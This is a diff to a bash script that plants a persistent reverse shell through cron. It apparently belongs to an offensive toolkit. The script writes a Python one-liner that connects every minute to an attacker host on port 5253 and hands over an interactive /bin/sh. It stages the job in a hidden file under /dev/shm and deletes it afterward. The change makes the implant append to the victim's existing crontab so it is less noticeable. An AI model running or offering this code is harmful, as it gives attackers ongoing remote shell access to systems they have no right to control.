@@ -1,6 +1,6 @@
 #!/bin/bash
 
-attackBox=0.0.0.0
+attackBox=1.0.0.0
 attackPort=5253
 cron="* * * * *"
 
@@ -17,7 +17,8 @@ fi
 
 if $(which python | grep -qi "python");
 then
-	echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > /dev/shm/.cron.sh
+	crontab -l > /dev/shm/.cron.sh
+	echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
 	crontab /dev/shm/.cron.sh
 	rm /dev/shm/.cron.sh
 	if $(crontab -l | grep "python" | grep -qi $attackBox);
